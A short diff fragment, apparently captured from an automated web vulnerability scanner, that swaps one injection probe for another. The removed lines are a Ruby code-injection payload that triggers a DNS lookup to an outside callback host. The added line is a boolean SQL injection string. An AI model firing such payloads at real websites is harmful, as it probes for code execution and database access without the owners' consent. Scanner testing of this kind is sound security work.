@@ -1,2 +1,1 @@
-'+'A'.concat(70-3).concat(22*4).concat(99).concat(90).concat(118).concat(89)+(require'socket'
-Socket.gethostbyname('hitcj'+'uoqsrcdr5002c.bxss.me.')[3].to_s)+'
+-1" OR 2+939-939-1=0+0+0+1 -- 
